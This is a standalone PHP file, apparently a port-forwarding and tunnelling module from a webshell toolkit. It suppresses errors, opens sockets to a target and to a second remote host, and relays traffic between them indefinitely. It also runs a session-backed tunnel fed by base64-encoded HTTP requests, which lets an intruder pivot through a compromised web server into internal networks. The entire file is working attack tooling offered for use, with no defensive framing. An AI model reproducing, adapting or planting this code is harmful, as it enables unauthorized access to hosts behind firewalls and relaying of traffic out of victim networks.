@error_reporting(0);
function main($action,$targetIP="",$targetPort="",$socketHash="",$remoteIP="",$remotePort="",$extraData="")
{
    switch($action)
    {
    case "createRemote":
        $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($localSocket === false) {
        	echo "\x37\x21\x49\x36Failed creating socket";
        	return;
        }
        $res = @socket_connect($localSocket, $targetIP, $targetPort);
        if ($res === false) {
        	echo "\x37\x21\x49\x36Failed connecting to target";
        	return;
        }
        socket_set_nonblock($localSocket);
        @session_start();
        $localPort = 0;
        if (socket_getsockname($localSocket, $sourceIp, $localPort) === false) {
        	$failReason = "socket_getsockname() failed: reason: " . socket_strerror(socket_last_error());
        }
        $localKey = "remote_local_" . $localPort . "_" . targetIP . "_" . targetPort;
        $_SESSION[$localKey] = $localSocket;
        $remoteSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($remoteSocket === false) {
        	echo "\x37\x21\x49\x36Failed creating socket";
        	return;
        }
        $res = @socket_connect($remoteSocket, $remoteIP, $remotePort);
        if ($res === false) {
        	echo "\x37\x21\x49\x36Failed connecting to remoteSocket";
        	return;
        }
        socket_set_nonblock($remoteSocket);
        $localPort = 0;
        if (socket_getsockname($remoteSocket, $sourceIp, $localPort) === false) {
        	$failReason = "socket_getsockname() failed: reason: " . socket_strerror(socket_last_error());
        }
        $remoteKey = "remote_remote_" . $localPort . "_" . targetIP . "_" . targetPort;
        $_SESSION[$remoteKey] = $remoteSocket;
        while (true) {
        	$localReadBuf = socket_read($localSocket, 10240);
        	if ($localReadBuf === false) {
        		//echo "\x37\x21\x49\x36Failed reading from localSocket";


        	} else {
        		$numOfRead = socket_write($remoteSocket, $localReadBuf, strlen($localReadBuf));
        		if ($numOfRead === false) {

        		}
        	};
        	$localWriteBuf = socket_read($remoteSocket, 10240);
        	if ($localWriteBuf === false) {

        	} else {
        		$numOfWrite = socket_write($localSocket, $localWriteBuf, strlen($localWriteBuf));
        		if ($numOfWrite === false) {

        		}
        	}
        }
        break;
        case "createLocal":
        $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($localSocket === false) {
                    	echo "\x37\x21\x49\x36Failed creating socket";
                    	return;
                    }
                    $res = @socket_connect($localSocket, $targetIP, $targetPort);
                    if ($res === false) {
                    	echo "\x37\x21\x49\x36Failed connecting to target".$targetIP.":".$targetPort;
                    	return;
                    }
                    socket_set_nonblock($localSocket);
                    @session_start();
                    				$_SESSION["local_running"] = true;
                                    $_SESSION["writebuf"] = "";
                                    $_SESSION["readbuf"] = "";
                                    ob_end_clean();
                                    header("Connection: close");
                                    ignore_user_abort();
                                    ob_start();
                                    $size = ob_get_length();
                                    header("Content-Length: $size");
                                    ob_end_flush();
                                    flush();
                    				session_write_close();

                    				while ($_SESSION["local_running"])
                    				{
                    					$readBuff = "";
                    					@session_start();
                    					$writeBuff = $_SESSION["writebuf"];
                    					$_SESSION["writebuf"] = "";
                    					session_write_close();
                                        if ($writeBuff != "")
                    					{
                    						$i = socket_write($localSocket, $writeBuff, strlen($writeBuff));
                    						if($i === false)
                    						{
                    							@session_start();
                                                $_SESSION["run"] = false;
                                                session_write_close();
                    							echo "\x37\x21\x49\x36Failed writing socket";
                    						}
                    					}
                    					while ($o = socket_read($localSocket, 512)) {
                    					if($o === false)
                    						{
                                                @session_start();
                                                $_SESSION["local_running"] = false;
                                                session_write_close();
                    							echo "\x37\x21\x49\x36Failed reading from socket";
                    						}
                    						$readBuff .= $o;
                    					}
                                        if ($readBuff!=""){
                                            @session_start();
                                            $_SESSION["readbuf"] .= $readBuff;
                                            session_write_close();
                                        }
                                        #sleep(0.2);
                    				}
                                    socket_close($localSocket);
                                    break;
        case "read":
                @session_start();
				$readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["local_running"];
				session_write_close();
                if ($running) {
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    echo "\x37\x21\x49\x36RemoteSocket read filed";
					return;
				}
            break;
        case "write":
			{
                @session_start();
                $running = $_SESSION["local_running"];
				session_write_close();
                if(!$running){
					echo "\x37\x21\x49\x36No more running, close now";
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = base64_decode($extraData);
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= $rawPostData;
					session_write_close();
                    header("Connection: Keep-Alive");
					return;
				} else {
					echo "\x37\x21\x49\x36POST request read filed";
				}
			}
			break;
		case "closeLocal":
		     @session_start();
             $running = $_SESSION["local_running"]=false;
             break;
    }

}